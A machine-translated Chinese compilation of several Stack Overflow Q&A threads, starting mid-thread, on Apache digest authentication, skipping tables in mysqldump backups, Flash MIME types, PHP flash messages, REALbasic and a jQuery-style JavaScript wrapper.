该网站需要密码才能启动。我已经使用 Apache 的`mod_auth_digest`. 在我的配置中，我尝试使用 AuthDigestDomain 指令来允许访问每个资产 URL。问题是，它似乎不起作用。当我加载页面时，我收到密码的初始提示，但是当它第一次从其中一个资产 URL 加载资产时，我收到第二次、第三次或第四次提示。在某些浏览器中，页面上的每个资源都会提示我。

我希望这只是我如何指定指令的问题，而不是 Apache 本身的授权限制。请参阅下面编辑的身份验证部分：

```
<Location />
  AuthType Digest
  AuthName "Restricted Site"
  AuthUserFile /etc/httpd/passwd/passwords
  AuthGroupFile /dev/null
  AuthDigestDomain / http://assets0.example.com/ http://assets1.example.com/ http://assets2.example.com/ http://assets3.example.com/
  require valid-user
  order deny,allow
  allow from all
</Location> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-01-09T09:39:08.227

我以前从未使用过 apache 的跨域身份验证。但：

1.  [Apache 文档](http://httpd.apache.org/docs/2.2/mod/mod_auth_digest.html)使用的语法与您的不同：

    ```
    AuthDigestDomain / assets0.example.com/ assets1.example.com/ assets2.example.com/ assets3.example.com/
    AuthDigestDomain /private/ http://mirror.my.dom/private2/ 
    ```

    注意到“http://”了吗？

2.  该文档还包含一些关于浏览器支持的警告。你确定你的浏览器可以处理这个吗？

# sql - 使用 mysqldump 跳过某些表

> ID：425158
> 
> 赞同：631
> 
> 时间：2009-01-08T17:30:17.323
> 
> 标签：sql, mysql, database, mysqldump

有没有办法从 mysqldump 命令限制某些表？

例如，我将使用以下语法*仅*转储table1 和 table2：

```
mysqldump -u username -p database table1 table2 > database.sql 
```

但是有没有类似的方法来转储*除*table1 和 table2 之外的所有表？我在 mysqldump 文档中没有找到任何东西，那么暴力（指定所有表名）是唯一的方法吗？

* * *

## 回答 #1

> 赞同：1054
> 
> 时间：2009-01-08T17:33:37.707

您可以使用[--ignore-table](https://dev.mysql.com/doc/refman/8.0/en/mysqldump.html#option_mysqldump_ignore-table)选项。所以你可以做

```
mysqldump -u USERNAME -pPASSWORD DATABASE --ignore-table=DATABASE.table1 > database.sql 
```

后面没有空格`-p`（这不是错字）。

要忽略多个表，请多次使用此选项，这[至少从 5.0 版](https://web.archive.org/web/20151222055612/http://dev.mysql.com/doc/refman/5.0/en/mysqldump.html#option_mysqldump_ignore-table)开始就可以使用。

如果您想要另一种方法来忽略多个表，您可以使用如下脚本：

```
#!/bin/bash
PASSWORD=XXXXXX
HOST=XXXXXX
USER=XXXXXX
DATABASE=databasename
DB_FILE=dump.sql
EXCLUDED_TABLES=(
table1
table2
table3
table4
tableN   
)

IGNORED_TABLES_STRING=''
for TABLE in "${EXCLUDED_TABLES[@]}"
do :
   IGNORED_TABLES_STRING+=" --ignore-table=${DATABASE}.${TABLE}"
done

echo "Dump structure"
mysqldump --host=${HOST} --user=${USER} --password=${PASSWORD} --single-transaction --no-data --routines ${DATABASE} > ${DB_FILE}

echo "Dump content"
mysqldump --host=${HOST} --user=${USER} --password=${PASSWORD} ${DATABASE} --no-create-info --skip-triggers ${IGNORED_TABLES_STRING} >> ${DB_FILE} 
```

* * *

## 回答 #2

> 赞同：140
> 
> 时间：2014-05-24T16:26:47.883

基于@Brian-Fisher 的回答并回答了这篇文章中一些人的评论，我的数据库中有一堆巨大的（且不必要的）表，所以我想在复制时跳过它们的内容，但保持结构：

```
mysqldump -h <host> -u <username> -p <schema> --no-data > db-structure.sql
mysqldump -h <host> -u <username> -p <schema> --no-create-info --ignore-table=schema.table1 --ignore-table=schema.table2 > db-data.sql 
```

生成的两个文件结构合理，但转储的数据现在约为 500MB 而不是 9GB，对我来说好多了。我现在可以将这两个文件导入另一个数据库进行测试，而不必担心操作 9GB 的数据或耗尽磁盘空间。

* * *

## 回答 #3

> 赞同：67
> 
> 时间：2013-09-06T00:36:13.110

对于多个数据库：

```
mysqldump -u user -p --ignore-table=db1.tbl1 --ignore-table=db2.tbl1 --databases db1 db2 .. 
```

* * *

## 回答 #4

> 赞同：65
> 
> 时间：2017-06-04T04:40:44.747

忽略多个表的另一个示例

```
/usr/bin/mysqldump -uUSER -pPASS --ignore-table={db_test.test1,db_test.test3} db_test> db_test.sql 
```

使用`--ignore-table`并创建一个表数组，语法如下

```
--ignore-table={db_test.table1,db_test.table3,db_test.table4} 
```

### **额外的：**

**导入数据库**

```
 # if file is .sql
 mysql -uUSER  -pPASS db_test < backup_database.sql
 # if file is .sql.gz
 gzip -dc < backup_database.sql.gz | mysql -uUSER -pPASSWORD db_test 
```

**忽略表并在 .sql.gz 中导出以节省空间的简单脚本**

```
#!/bin/bash

#tables to ignore
_TIGNORE=(
my_database.table1
my_database.table2
my_database.tablex
)

#create text for ignore tables
_TDELIMITED="$(IFS=" "; echo "${_TIGNORE[*]/#/--ignore-table=}")"

#don't forget to include user and password
/usr/bin/mysqldump -uUSER -pPASSWORD --events ${_TDELIMITED} --databases my_database | gzip -v > backup_database.sql.gz 
```

**包含对您有帮助的信息的链接**

*   [mysqldump 和 gzip](https://stackoverflow.com/questions/22278217/mysqldump-gzip-commands-to-properly-create-a-compressed-file-of-a-mysql-databa)
*   [mysqldump 到 tar.gz](https://serverfault.com/questions/106595/mysqldump-to-a-tar-gz)
*   [如何将 sql.gz 文件加载到我的数据库中？](https://stackoverflow.com/questions/2756585/how-do-i-load-a-sql-gz-file-to-my-database-importing/2756591)

> 注意：在带有 mysql Ver 14.14 Distrib 5.5.55 的 ubuntu 服务器中测试

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2016-11-07T09:50:29.963

排除一些表*数据*，但不排除表*结构*。这是我的做法：

转储所有表的数据库结构，没有任何数据：

```
mysqldump -u user -p --no-data database > database_structure.sql 
```

然后用数据转储数据库，排除的表除外，并且不转储结构：

```
mysqldump -u user -p --no-create-info \
    --ignore-table=database.table1 \
    --ignore-table=database.table2 database > database_data.sql 
```

然后，将其加载到新数据库中：

```
mysql -u user -p newdatabase < database_structure.sql
mysql -u user -p newdatabase < database_data.sql 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2019-01-10T09:23:56.337

您可以将`mysqlpump`命令与

```
--exclude-tables=name 
```

命令。它指定要排除的表的逗号分隔列表。

mysqlpump 的语法与 mysqldump 非常相似，但它的性能更高。有关如何使用排除选项的更多信息，您可以在此处阅读：[https ://dev.mysql.com/doc/refman/5.7/en/mysqlpump.html#mysqlpump-filtering](https://dev.mysql.com/doc/refman/5.7/en/mysqlpump.html#mysqlpump-filtering)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2020-06-12T17:19:02.167

一般来说，当您不想或没有时间处理巨大的桌子时，您需要使用此功能。如果是这种情况，最好使用 mysqldump 限制结果集中的 --where 选项。例如，`mysqldump -uuser -ppass database --where="1 = 1 LIMIT 500000" > resultset.sql`。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2021-03-02T18:19:37.857

**使用 mysqldump 跳过某些表**

假设某些数据库中有一些测试表，您想将它们从备份中排除；您可以使用 --exclude-tables 选项指定，该选项将在所有数据库中排除名称为 test 的表：

`shell> mysqldump --exclude-tables=test --resultfile=backup_excluding_test.sql`

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2015-11-06T05:50:41.663

# 转储包含所有表的所有数据库，但跳过某些表

在github上：[https ://github.com/rubo77/mysql-backup.sh/blob/master/mysql-backup.sh](https://github.com/rubo77/mysql-backup.sh/blob/master/mysql-backup.sh)

```
#!/bin/bash
# mysql-backup.sh

if [ -z "$1" ] ; then
  echo
  echo "ERROR: root password Parameter missing."
  exit
fi
DB_host=localhost
MYSQL_USER=root
MYSQL_PASS=$1
MYSQL_CONN="-u${MYSQL_USER} -p${MYSQL_PASS}"
#MYSQL_CONN=""

BACKUP_DIR=/backup/mysql/

mkdir $BACKUP_DIR -p

MYSQLPATH=/var/lib/mysql/

IGNORE="database1.table1, database1.table2, database2.table1,"

# strpos $1 $2 [$3]
# strpos haystack needle [optional offset of an input string]
strpos()
{
    local str=${1}
    local offset=${3}
    if [ -n "${offset}" ]; then
        str=`substr "${str}" ${offset}`
    else
        offset=0
    fi
    str=${str/${2}*/}
    if [ "${#str}" -eq "${#1}" ]; then
        return 0
    fi
    echo $((${#str}+${offset}))
}

cd $MYSQLPATH
for i in */; do
    if [ $i != 'performance_schema/' ] ; then 
    DB=`basename "$i"` 
    #echo "backup $DB->$BACKUP_DIR$DB.sql.lzo"
    mysqlcheck "$DB" $MYSQL_CONN --silent --auto-repair >/tmp/tmp_grep_mysql-backup
    grep -E -B1 "note|warning|support|auto_increment|required|locks" /tmp/tmp_grep_mysql-backup>/tmp/tmp_grep_mysql-backup_not
    grep -v "$(cat /tmp/tmp_grep_mysql-backup_not)" /tmp/tmp_grep_mysql-backup

    tbl_count=0
    for t in $(mysql -NBA -h $DB_host $MYSQL_CONN -D $DB -e 'show tables') 
    do
      found=$(strpos "$IGNORE" "$DB"."$t,")
      if [ "$found" == "" ] ; then 
        echo "DUMPING TABLE: $DB.$t"
        mysqldump -h $DB_host $MYSQL_CONN $DB $t --events --skip-lock-tables | lzop -3 -f -o $BACKUP_DIR/$DB.$t.sql.lzo
        tbl_count=$(( tbl_count + 1 ))
      fi
    done
    echo "$tbl_count tables dumped from database '$DB' into dir=$BACKUP_DIR"
    fi
done 
```

[在https://stackoverflow.com/a/17016410/1069083](https://stackoverflow.com/a/17016410/1069083)的帮助下

它使用更快的 lzop，请参阅： http://pokecraft.first-world.info/wiki/Quick_Benchmark: [_Gzip_vs_Bzip2_vs_LZMA_vs_XZ_vs_LZ4_vs_LZO](http://pokecraft.first-world.info/wiki/Quick_Benchmark:_Gzip_vs_Bzip2_vs_LZMA_vs_XZ_vs_LZ4_vs_LZO)

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2018-10-04T22:34:20.923

我喜欢 Rubo77 的解决方案，在修改 Paul 的解决方案之前我没见过。这将备份单个数据库，不包括您不想要的任何表。然后它将 gzip 并删除超过 8 天的所有文件。我可能会使用 2 个版本，每天执行一次完整的（减去日志表），另一个版本使用几个 cron 作业备份每小时更改最多的最重要的表。

```
#!/bin/sh
PASSWORD=XXXX
HOST=127.0.0.1
USER=root
DATABASE=MyFavoriteDB

now="$(date +'%d_%m_%Y_%H_%M')"
filename="${DATABASE}_db_backup_$now"
backupfolder="/opt/backups/mysql"
DB_FILE="$backupfolder/$filename"
logfile="$backupfolder/"backup_log_"$(date +'%Y_%m')".txt

EXCLUDED_TABLES=(
logs
)
IGNORED_TABLES_STRING=''
for TABLE in "${EXCLUDED_TABLES[@]}"
do :
   IGNORED_TABLES_STRING+=" --ignore-table=${DATABASE}.${TABLE}"
done

echo "Dump structure started at $(date +'%d-%m-%Y %H:%M:%S')" >> "$logfile"
mysqldump --host=${HOST} --user=${USER} --password=${PASSWORD} --single-transaction --no-data --routines ${DATABASE}  > ${DB_FILE} 
echo "Dump structure finished at $(date +'%d-%m-%Y %H:%M:%S')" >> "$logfile"
echo "Dump content"
mysqldump --host=${HOST} --user=${USER} --password=${PASSWORD} ${DATABASE} --no-create-info --skip-triggers ${IGNORED_TABLES_STRING} >> ${DB_FILE}
gzip ${DB_FILE}

find "$backupfolder" -name ${DATABASE}_db_backup_* -mtime +8 -exec rm {} \;
echo "old files deleted" >> "$logfile"
echo "operation finished at $(date +'%d-%m-%Y %H:%M:%S')" >> "$logfile"
echo "*****************" >> "$logfile"
exit 0 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2019-08-23T23:58:48.780

为了完整起见，这里有一个脚本，它实际上可以是从数据库中获取备份的单行脚本，不包括（忽略）所有视图。数据库名称假定为雇员：

```
ignore=$(mysql --login-path=root1 INFORMATION_SCHEMA \
    --skip-column-names --batch \
    -e "select 
          group_concat(
            concat('--ignore-table=', table_schema, '.', table_name) SEPARATOR ' '
          ) 
        from tables 
        where table_type = 'VIEW' and table_schema = 'employees'")

mysqldump --login-path=root1 --column-statistics=0 --no-data employees $ignore > "./backups/som_file.sql" 
```

您可以更新查询的逻辑。通常使用`group_concat`并且`concat`您可以生成几乎任何所需的字符串或 shell 命令。

# c# - 为什么智能感知不根据我传入的内容显示适当的方法？

> ID：425161
> 
> 赞同：1
> 
> 时间：2009-01-08T17:30:51.317
> 
> 标签：c#, visual-studio, intellisense

就像有3种方法一样：

```
Modify ( int arg )
Modify ( double arg )
Modify ( string arg ) 
```

如果我传入一个双精度变量，它应该自动导航到方法#2，而不是我向下滚动查看是否有一个方法可以得到双精度，对吧？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-01-08T17:46:53.827

我可以想到两个原因。首先，Intellisense 必须知道隐式转换规则等，并且最终与编译器一样聪明。他们可能只是认为简单的实现已经足够好了（想象一下比你的情况更复杂的情况——例如将函数结果直接传递给另一个函数）。另外，我认为如果 Intellisense 隐藏了我想要调用的特定重载（因为可能参数的类型错误），那会很烦人 - 我宁愿用我想要的函数完成代码编写，然后返回并修复任何错误。

# .net - 嵌入式 Flash 视频：在本地工作，但不能在登台服务器上工作

> ID：425169
> 
> 赞同：2
> 
> 时间：2009-01-08T17:33:13.543
> 
> 标签：.net, asp.net, flash

我能够在我的本地机器上嵌入一个自动播放的视频。

当我将解决方案上传到登台服务器时，我什么也得不到。很奇怪，代码中的一切都是一样的。

我在本地机器上运行 Vista，在服务器上运行 Windows Server 2003。

在这方面有更多经验的人是否会为我指明正确的方向？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-08T17:39:14.373

您需要在服务器上为 SWF 和 FLV 文件设置 Mime-Type。在 Adob​​e 的网站上查看这些文档：

SWF 的 Mime-Type 必须为“application/x-shockwave-flash”

[SWF Mime 类型](http://kb.adobe.com/selfservice/viewContent.do?externalId=tn_4151 "SWF Mime 类型")

FLV 必须具有“flv-application/octet-stream”的 Mime-Type

[FLV 哑剧类型](http://kb.adobe.com/selfservice/viewContent.do?externalId=tn_19439&sliceId=2 "FLV 哑剧类型")

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T17:50:11.870

DGarcia 是对的——您必须在 IIS 上手动设置这些。我刚刚检查了我的设置，它们就像他指定的那样。在 IIS 中，右键单击并选择主服务器节点的属性，然后单击 MIME 类型。从那里开始应该是不言自明的。

# php - PHP 在页面之间传递消息

> ID：425178
> 
> 赞同：4
> 
> 时间：2009-01-08T17:35:05.707
> 
> 标签：php

我在用户输入编辑 XML 文件的页面上有一个表单，表单的操作是将其发送到单独的 PHP 脚本，在他们点击提交后进行编辑。该脚本将写入成功或失败，无论哪种方式，我都会通过标题将其重定向回表单页面。有没有一种简单的方法可以将确认或失败消息传回表单页面？我可以在 URL 中做到这一点，但我宁愿保持那种干净的外观。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2009-01-08T17:43:07.127

我看到它完成的方式（并且我个人使用）只是会话。

```
// process something
if($success) {
    flash_message('success','Did whatever successfully.');
} else {
    flash_message('error','Oops, something went wrong.');
}
header('Location: whatever.php'); 
```

然后在其他地方，在您的库或函数文件或其他任何地方：

```
function flash_message($type, $message) {
    // start session if not started
    $_SESSION['message'] = array('type' => $type, 'message' => $message);
} 
```

然后在视图/页面中您可以执行以下操作：

```
if(isset($_SESSION['message'])) {
    printf("<div class='message %s'>%s</div>", $_SESSION['message']['type'],
    $_SESSION['message']['message']);
    unset($_SESSION['message']);
} 
```

这是非常基本的，但如果你想要多条消息等等，你可以从那里扩展它。底线是我相信会议最适合这个。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-08T17:41:07.630

我更喜欢将表单处理代码和表单显示代码放在同一个页面中。如果你真的想将它分开，你可以将代码移动到不同的文件中，并从表单文件中包含该文件，但从客户端来看，它看起来像同一个 PHP 文件。

然后，始终提交到表单并在显示表单之前在顶部进行错误检查。如果有要显示的消息，您只需再次呈现表单并将消息与用户数据一起显示，以便他们解决问题。他们可以再次提交，您可以再次检查错误。如果他们成功提交，您可以将他们重定向到其他地方，或者只显示“成功”消息。

# html - 使用 VBA 的 SharePoint Designer 2007 对象模型简介

> ID：425179
> 
> 赞同：1
> 
> 时间：2009-01-08T17:36:00.697
> 
> 标签：html, sharepoint-2007

我发现很难找到 Microsoft SharePoint Designer 2007 中使用的对象模型的介绍。出于某种原因，如果在线帮助充满了“找不到页面”。我怀疑它类似于 Internet Explorer DOM 中使用的对象模型。参考手册在 MSDN 在线（但不在我的本地副本中），但与许多这样的帮助系统一样，在使用参考之前，您必须知道自己在做什么。

我首先要做的就是实现一个该死的宏来将文本粘贴到网页中，而无需继续单击编辑、粘贴文本、确定 :-)

干杯，罗布。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-15T17:48:30.090

Rob - 如果您还没有找到答案 - 您是否看过 MSDN 库中的 SharePoint Designer 开发人员参考？那里的一些概念性文章可能会对您有所帮助 - 例如关于探索过程的这篇文章：http: [//msdn.microsoft.com/en-us/library/bb208643.aspx](http://msdn.microsoft.com/en-us/library/bb208643.aspx)

您也可以尝试在 SharePoint 开发讨论组中寻求帮助：http: [//www.microsoft.com/office/community/en-us/default.mspx? dg=microsoft.public.sharepoint.development_and_programming&lang=en&cr=US](http://www.microsoft.com/office/community/en-us/default.mspx?dg=microsoft.public.sharepoint.development_and_programming&lang=en&cr=US)

最好的，斯蒂芬妮

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2011-02-03T14:04:28.467

刚刚花了几个小时试图找到答案，这里有一个帮助链接。上面的 Microsoft 链接将您带到一个空白页面 - 对象模型参考位于：

[http://msdn.microsoft.com/en-us/library/bb149156(v=office.12).aspx](http://msdn.microsoft.com/en-us/library/bb149156(v=office.12).aspx)

在 Internet 上似乎没有其他文章 - 任何地方 - 都特定于 SharePoint Designer VBA 编码。似乎也没有关于这个主题的任何书籍。

如果您已经了解 VBA，上面的链接应该对您有所帮助；否则，我们似乎几乎是靠我们自己！

安迪

# asp.net - 如何使用 Javascript 将节点添加到 TreeView 控件中

> ID：425181
> 
> 赞同：0
> 
> 时间：2009-01-08T17:36:21.617
> 
> 标签：asp.net, javascript, treeview

我只是想学习如何将节点添加到 TreeView 控件（它从具有父子关系的数据库中获取其数据）。当然，当我选择一个节点时，我想添加的新节点应该添加到所选节点下，然后在将其添加到所选节点之后，我也想将新节点添加到数据库中。我可以处理数据库部分，但我不知道如何处理客户端部分。

我希望我能描述这个问题。

提前致谢....

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-05-08T17:06:08.690

我正在尝试对此进行 asp.neting： [MVC 在浏览器](http://blog.codeville.net/2007/08/13/mvc-in-the-browser/) 中使用 js 和 xslt 解决您的（我们的）问题；-)

# macos - REALBasic 值 50 美元吗？

> ID：425185
> 
> 赞同：16
> 
> 时间：2009-01-08T17:38:04.157
> 
> 标签：macos, realbasic, xojo

作为 12 年以上的 Windows 和 Web 开发人员以及“在家”的 Mac 用户，我想知道是否值得将 REALBasic 用于个人用途。我经常想涉足 OS X 的开发。我知道 VB、Java、C#，但不知道 C、C++ 或 Objective-C。我没有一个特定的项目，也没有学习Objective-C的动力，所以我想知道RB是否足够简单和足够好让我开始使用一些小应用程序。

以下是我的担忧/问题：

*   我在“现实世界”中没有听到太多关于 REALBasic 的信息——stackoverflow 上只有一个问题标记为“realbasic”——那么，它是一个可行的开发环境，还是只是一种“玩具”语言/IDE？

*   使用 RB 编写/编译的应用程序是否有任何怪癖或陷阱？

*   有没有用 RB 编写的商业应用程序？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2009-01-08T22:04:03.887

具体回答你的问题...

> 我在“现实世界”中没有听到太多关于 REALBasic 的信息——stackoverflow 上只有一个问题标记为“realbasic”——那么，它是一个可行的开发环境，还是只是一种“玩具”语言/IDE？

当然，对于大多数类型的应用程序来说，它都是一个可行的环境。我目前在家里和工作中使用它。我已经在整个企业中开发和分发跨平台应用程序，以协助我们的数字资产管理工作、使用 Applescript 进行营销授权，以及帮助我​​度过每一天的大量有效的小应用程序。

> 使用 RB 编写/编译的应用程序是否有任何怪癖或陷阱？

没有什么是防御性编程解决不了的，也没有什么是在操作系统问题得到解决之前无法完成的。但这与大多数语言相同。

> 有没有用 RB 编写的商业应用程序？

绝对地。但我认为商业应用程序宣传构建它们的开发环境并不常见。

@ARKBAN

> 代码不在纯文本文件中。这意味着你不能真正使用版本控制，而且你不能让多个开发人员一起工作——永远不会。

这是不正确的，并且已经有一段时间了。REALbasic 导出为 XML 和 VCP 格式。

由于担心我的回复被标记为垃圾邮件，我将不遗余力地添加指向下载页面的链接。我想你可以从这里解决它。

干杯

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2009-01-08T22:26:26.400

现在 50 美元并不是很多钱，而 REALbasic Personal 绝对物有所值。甚至是讨价还价。对于你说你想做的，它应该是完美的。

当前版本的 REALbasic 非常强大。他们可以将项目保存为文本文件格式，以便与源代码管理一起使用。我每天在多人团队中将它与 Subversion 一起使用。它完全面向对象，具有自省功能，多年来一直拥有扩展方法（C# 仅在 .NET 3.0 中获得它们），包括 SQLite 作为其内置数据库等等。

当然也有缺点。它还没有创建 Cocoa 应用程序（它们现在是 Carbon），它没有像其他一些 IDE 那样多的内置控件，它使用相当多的 RAM，并且自动化构建比它应该的更难。尽管如此，REALbasic 与玩具语言相去甚远。它只是背负着一个坏名声:-)

但是，我保证您将在使用 REALbasic 的几分钟内创建您的第一个 OS X 应用程序。

**更新**：截至 2013 年，REALbasic 现在被称为[Xojo](http://www.xojo.com)（但语言仍然相同）。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2009-01-12T12:40:42.330

作为一种语言，REALbasic 比大多数语言更简洁，并且具有 C# 刚刚在最近版本中添加的习语（例如扩展方法）。

跨平台框架非常易于使用并且很好地集成到 IDE 中。集成是如此顺利，它往往会掩盖框架的真正 OO 本质以及将事件设计到语言中的优雅方式——有些人将其视为 VB6 克隆，但这是非常错误的。

与 Visual Studio 相比，IDE 缺少一些功能，但也更易于使用且视觉噪音更少。它有一些功能，尤其是历史记录和导航，这些功能优于 Visual Studio，并且可以非常容易地绕过大型项目。

对于业余爱好者编程，我反对它的一个主要观点是，它可能会占用大量内存，在内存不足 1GB 的机器上运行不佳。话虽如此，我在 1.5GHz、1.25GB PPC PowerBook 12"（我的旅行机器）上使用它非常愉快，前提是我要小心我同时运行的其他东西。

我也在 Visual Studio 和 XCode 中工作 - 两者都比不上在 REALbasic 中将程序放在一起的容易程度。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-01-08T17:51:05.613

如果您想以50 美元的价格为支持的平台 RealBasic开发*简单的 GUI 应用程序，这是很划算的。*它不是最先进的开发环境，但对于某些工作来说，它绝对是正确的工具。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2009-01-08T17:52:19.493

如果没记错的话，[OpenSong](http://www.opensong.org/)是用 RealBASIC 编写的。我玩过这个演示，虽然我喜欢它的一些东西，但我认为你最好使用分布更广泛的东西。

它不是一种“玩具”语言，您可以用它进行一些认真的开发。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2009-01-08T17:49:24.273

在家里，个人使用，我会考虑。我以前用过它，它适合这种类型的使用。但是，我不能说我会将它作为多开发团队甚至大型单开发项目的首选。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2009-01-12T13:14:40.137

> REALBasic 值 50 美元吗？

当然是。上次我检查它被列为超过 6 倍。我想说，50 美元，值得你自己去发现。

> REALBasic 是一个可行的开发环境吗？

这一切都取决于，对于爱好的东西，也许对于一些小企业来说，它可能是一个很好的工具，即使只是为了模拟 UI。RB基本上可以做Carbon可以做的所有事情，所以你可以做的事情并没有明确的限制。

使用 Xcode 在 Objective-C 中很难推荐 REALBasic 而不是 Cocoa，但我可以想象我会的情况。你的情况对我来说不够清楚，无法提出任何建议。

REALBasic 比 Mac OS X 推荐的工具链更容易上手，它的优点是有点类似于 VisualBasic，可以交叉编译到 Windows 甚至 Linux。

> 使用 RB 编写/编译的应用程序是否有任何怪癖或陷阱？

除了它们看起来比我想象的要大之外，它们是碳，而不是可可

> 有没有用 RB 编写的商业应用程序？

可能，但我不知道。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2009-04-17T18:03:19.890

如果您希望创建跨平台应用程序，REALbasic 是一个极好的使用环境，它远非“玩具”语言。有许多用 RB 编写的商业应用程序。

IDE 不是最好的，但它很好，并且可以在团队环境中与 Subversion for Version Control 配合使用。

MBS 和 Einhugur 插件的可用性打开了 RB 并为您提供了一些非常强大的功能。

我目前所有的商业应用程序都是用 RB 编写的 - 没有人要求退款，因为它是用 RB 编写的 :-) 如果应用程序以合理的成本完成了他们要求的工作，那么没有人真正关心语言。

无论如何尝试它不会花费你太多:-) 你可以在 Arten Science 网站上看到我的东西。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-12-17T04:05:40.330

REALbasic 是一门很好的语言，它可以用于那些不想立即学习 Objective-C 的人开始编写 Mac OS X。当我有一台 Windows PC 时，我开始使用 REALbasic Pro，这也是我购买第一台 Mac 的原因（这是测试我为 Mac 创建的应用程序所必需的）；现在我只有两台 Mac，而且我不再使用 REALbasic。

我停止使用它的原因是Apple免费提供Xcode，我更喜欢使用允许我创建Cocoa应用程序的IDE，而不是只允许我创建Carbon应用程序的IDE。另一个原因是为了做一些更复杂的事情，它需要你有插件来做不能直接做的事情（实际上有两个很好的插件可以使用）。

简而言之，REALbasic 物有所值。如果那时有适用于 Windows 的 REALbasic 和适用于 Mac 的 REALbasic，您可以使用您为这两个平台开发的一些代码。
当然，使用 REALbasic 开发的软件很少，只有知道 REALbasic 的人通常才能了解应用程序是否使用 REALbasic 制作，尤其是应用程序是否将 RBScript 暴露给最终用户。

* * *

## 回答 #10

> 赞同：-1
> 
> 时间：2009-04-17T18:48:52.573

每个 Mac OS X 都附带 Java，它带有 Cocoa 的本机绑定（尽管我相信它们从 10.4 开始就没有保持最新状态）。我个人使用 Java 和 SWT 在 Mac OS X（也必须在 PocketPC 设备上运行）上开发应用程序，我发现 Mac OS X + PostgreSQL + Eclipse + Java 是一个不错的开发环境。您也知道 - 但如果您每天在工作中使用它，这可能是不选择它的原因:-)！

* * *

## 回答 #11

> 赞同：-3
> 
> 时间：2009-01-08T17:55:57.787

我认为单声道将是在 Mac OS X 中使用的更好平台。

知识更容易传递，平台更广泛，而且是免费的。

# javascript - 如何创建类似 jquery 的 $() 包装函数？

> ID：425189
> 
> 赞同：0
> 
> 时间：2009-01-08T17:40:15.243
> 
> 标签：javascript

我正在创建一个小代码插件，它允许你用数组做一些事情。我不希望使用原型构造将函数添加到数组对象中，我想要的是人们可以执行以下操作：

```
arrayFunction( [1, 2, 3] ).someSpecialArrayFunction(); 
```

从而使普通数组对象保持不变。
所以我想出了以下结构（灵感来自 jQuery 源代码）：

```
var arrayFunction = window.arrayFunction = function(array) {
    return new arrayFunction.fn.init(array);
}
arrayFunction.fn = arrayFunction.prototype = {
    init: function(array){
        this.a = array;
        //should I return something here?
    },
    someSpecialArrayFunction: function(){
        //Super cool custom stuff here.
    }
} 
```

然而，这不起作用（显然）。init function() 中应该发生什么？

现在的错误是当我尝试时：

```
 arrayFunction(array).someSpecialArrayFunction(); 
```

它说 someSpecialArrayFunction() 不是函数？

应该如何做到这一点？

**编辑**
是的，这确实是一个简化的例子。实际的东西有更多的方法。

另外，我只是想如果它也支持 chaning 会有多棒，你会怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-08T18:08:03.457

或者简单地说：

```
var arrayFunction = function(array) {
    var someSpecialArrayFunction = function() {
        // do something with array
    };
    return {
        someSpecialArrayFunction: someSpecialArrayFunction
    }
};
arrayFunction( [1, 2, 3] ).someSpecialArrayFunction(); 
```

尽管对此要小心，但如果您最终使用的方法太多，使用原型可能会更好。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T17:57:00.483

我不确定这是获得你想要的东西的最佳语法，但我想这是一个精简的例子......无论如何，这是让它工作的快速方法

```
var arrayFunction = window.arrayFunction = function(array) {
    return new arrayFunction.fn.init(array);
}
arrayFunction.fn = arrayFunction.prototype = {
    init: function(array){
        var a = array;
        return  {
            someSpecialArrayFunction: function(){
                alert (a.join(' - ') ); //Super cool custom stuff here.
            }
        };
    },
}
arrayFunction( [1, 2, 3] ).someSpecialArrayFunction(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-08T18:26:34.153

**sktrdie**的[答案](https://stackoverflow.com/questions/425189/howto-create-a-jquery-like-wrapper-function#425276)看起来不错。

要考虑的另一件事是使用[享元模式](http://en.wikipedia.org/wiki/Flyweight_pattern)，而不是在每次调用包装器时返回一个新的对象实例。ExtJS 函数[Ext.fly](http://extjs.com/deploy/dev/docs/?class=Ext)执行此操作；它返回一个全局共享实例。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-08T18:41:00.817

尝试这样的事情：

```
var mathWrapper = function(array) {
    return {
        mean : function(){
            if (array.length == 0) return(0);
            var total = 0;
            for (var i = 0; i < array.length; i++) total += array[i];
            return(total / array.length);
        },
    };
} 
```

通过类似的东西调用它

```
document.write(mathWrapper([1,2,3,4,5,6]).mean()); 
```

应该返回数组元素的平均值。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-08T19:08:31.633

如果您不想更改`Array.prototype`，唯一真正可行的解决方案是将方法添加到特定的数组对象：

```
function doSomething() {}
function doOther() {}

function wrap(array) {
    array.doSomething = doSomething;
    array.doOther = doOther;
    return array;
} 
```

请注意，我没有定义`doSomething()`和`doOther()`在内部`wrap()`- 否则，我们将在每次调用时创建新的函数对象，这是非常低效的。

更复杂的变体如下：

```
function doSomething() {}
function doOther() {}

function wrap(array) {
    if(this instanceof arguments.callee) {
        this.doSomething = doSomething;
        this.doOther = doOther;
    }
    else {
        arguments.callee.prototype = array;
        return new arguments.callee;
    }
} 
```

